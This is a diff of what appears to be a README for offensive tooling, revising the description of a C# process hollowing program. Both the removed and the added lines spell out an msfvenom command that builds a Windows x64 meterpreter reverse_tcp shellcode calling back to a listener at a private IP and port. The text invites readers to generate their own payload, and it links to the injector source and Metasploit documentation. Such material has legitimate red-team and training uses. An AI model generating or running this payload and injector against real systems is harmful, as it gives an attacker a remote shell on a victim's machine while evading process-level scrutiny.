@@ -12,10 +12,8 @@ The programmer needs only to replace the namespace & class with that of their pa
 1. https://isc.sans.edu/forums/diary/Malicious+Script+With+Multiple+Payloads/25090/
 2. https://www.udemy.com/course/reverse-engineering-deep-dive/
 
-//C# Process Hollowing
-Gmgorelik's C# Process Hollowing implementation (Ref #1). The shell code being executed was generated using the following msfvenom command:
-msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192[.]168[.]56[.]104 LPORT=56104 -b "\x00" -f cs HollowP.cs
-
+//C# Process Hollowing is Gmgorelik's implementation (Ref #1). The shell code being executed was generated using the following msfvenom command:
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192[.]168[.]56[.]104 LPORT=56104 -b "\x00" -f cs HollowP.cs 
 It calls out to a meterpreter listener on 192[.]168[.]56[.]104:56104. You may modify the above command to generate your own payload all the same. This program is mostly commodity & highly detectable.
 1. https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
 2. https://www.offensive-security.com/metasploit-unleashed/msfvenom/
